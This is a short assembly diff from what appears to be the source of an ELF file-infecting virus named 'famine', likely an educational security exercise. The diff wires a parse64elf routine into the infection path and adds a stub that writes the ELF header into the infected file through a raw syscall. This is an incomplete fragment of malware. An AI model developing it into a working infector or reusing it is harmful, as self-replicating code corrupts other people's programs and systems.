@@ -242,7 +242,9 @@ famine_file:
 	call create_infected_file;will return a fd to it
 	cmp rax, -1
 	je leave_famine_file; skip if we couldn't create add
-;	call parse64elf
+	mov rdi, [rsp + 4]; void *file
+	mov rsi, rax; wfd
+	call parse64elf
 	; end parse MAGIC
 	
 	
@@ -430,4 +432,27 @@ push rdx
 	mov rax, rbx
 	pop rdx
 	pop rcx
+retn
+
+; void parse64elf(void *file, int wfd)
+parse64elf:
+
+	call parse64elfheader
+
+
+retn
+
+parse64elfheader:
+	push rdi
+	push rsi
+
+	mov rbx, rdi
+	mov rdi, rsi
+	mov rsi, rbx
+	mov rdx, 64 ; sizeof(Elf64_Ehdr)
+	mov rax, 1
+	syscall; write(wfd, file, sizeof(Elf64_Ehdr));
+	
+	pop rsi
+	pop rdi
 retn
